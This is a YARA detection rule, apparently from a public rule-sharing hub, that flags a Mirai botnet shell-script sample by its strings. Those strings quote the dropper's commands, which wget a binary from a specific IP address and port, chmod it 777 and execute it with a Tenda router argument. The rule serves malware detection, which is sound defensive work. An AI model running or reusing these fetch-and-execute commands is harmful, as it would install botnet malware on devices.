rule SCRIPT_Sample_Mirai_378c84b5
{
    meta:
        author = "Marjoriefort"
        description = "Detects Mirai (script_sh, etat binaire)"
        date = "2026-10-01"
        reference_sha256 = "378c84b547b9c0158ce497f589aae592d465eb06ba7ab572e5c98a001a0a43e6"
        yarahub_uuid = "04e4ad34-672e-4091-9953-6fb37d6c3b21"
        famille = "Mirai"
        famille_source = "reputation"
        classe = "script_sh"
        etat = "binaire"
        confidence_suggeree = "low"
        source = "forge_miss M3 v1.9.48"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "8bc8fc5ce1b0a1e2e096932043039ce3"
        yarahub_reference_link = "https://github.com/Marjoriefort/yara-rules"
    strings:
        $s0 = "wget -O b http://85.137.54.178:8080/bins/5||wget -O b http://85.137.54.178:8080/bins/6" ascii
        $s1 = "chmod 777 b;./b tenda-goform" ascii
    condition:
        true and filesize < 50MB and 2 of them
}
